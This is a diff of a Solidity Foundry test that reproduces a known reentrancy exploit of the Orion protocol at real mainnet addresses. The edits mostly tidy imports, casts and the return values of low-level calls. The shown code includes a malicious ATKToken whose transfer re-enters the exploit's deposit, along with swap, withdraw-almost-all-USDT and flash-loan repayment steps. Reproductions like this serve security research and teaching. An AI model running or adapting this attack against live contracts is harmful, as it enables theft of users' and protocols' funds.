@@ -1,8 +1,11 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.17;
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV3Router} from "src/interfaces/IUniswapV3Router.sol";
 // @Analsysi
 // https://twitter.com/peckshield/status/1621337925228306433
 // https://twitter.com/BlockSecTeam/status/1621263393054420992
@@ -43,8 +46,8 @@ contract ContractTest is Test {
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     ORION Orion = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);
     OrionPoolV2Factory Factory = OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);
-    IUniswapV2Router Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-    IUniswapV3Router RouterV3 = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
+    IUniswapV3Router RouterV3 = IUniswapV3Router(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564));
     IUniswapV2Pair Pair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
     uint256 flashAmount;
     IERC20 ATK;
@@ -66,7 +69,8 @@ contract ContractTest is Test {
         ATK = new ATKToken(address(this));
         addLiquidity();
 
-        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Orion), type(uint256).max));
+        (bool success8,) =
+            address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Orion), type(uint256).max));
         USDC.approve(address(Orion), type(uint256).max);
         Orion.depositAsset(address(USDC), 500_000);
 
@@ -86,7 +90,7 @@ contract ContractTest is Test {
         path[2] = address(USDT);
         Orion.swapThroughOrionPool(10_000, 0, path, true);
         Orion.withdraw(address(USDT), uint112(USDT.balanceOf(address(Orion)) - 1));
-        address(USDT).call(
+        (bool success9,) = address(USDT).call(
             abi.encodeWithSignature("transfer(address,uint256)", address(Pair), (flashAmount * 1000) / 997 + 1000)
         );
     }
@@ -96,7 +100,8 @@ contract ContractTest is Test {
         address Pair1 = Factory.getPair(address(ATK), address(USDT));
         Factory.createPair(address(ATK), address(USDC));
         address Pair2 = Factory.getPair(address(ATK), address(USDC));
-        address(USDT).call(abi.encodeWithSignature("transfer(address,uint256)", address(Pair1), 5 * 1e5));
+        (bool success5,) =
+            address(USDT).call(abi.encodeWithSignature("transfer(address,uint256)", address(Pair1), 5 * 1e5));
         ATK.transfer(address(Pair1), 50 * 1e18);
         USDC.transfer(address(Pair2), 5 * 1e5);
         ATK.transfer(address(Pair2), 50 * 1e18);
@@ -109,7 +114,9 @@ contract ContractTest is Test {
     }
 
     function USDTToWETH() internal {
-        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(RouterV3), type(uint256).max));
+        (bool success6,) = address(USDT).call(
+            abi.encodeWithSignature("approve(address,uint256)", address(RouterV3), type(uint256).max)
+        );
         IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(USDT),
             tokenOut: address(WETH),
@@ -146,7 +153,7 @@ contract ATKToken is IERC20 {
         balanceOf[msg.sender] -= amount;
         balanceOf[recipient] += amount;
         if (USDT.balanceOf(exp) > 1e6) {
-            exp.call(abi.encodeWithSignature("deposit()"));
+            (bool success4,) = exp.call(abi.encodeWithSignature("deposit()"));
         }
         emit Transfer(msg.sender, recipient, amount);
         return true;
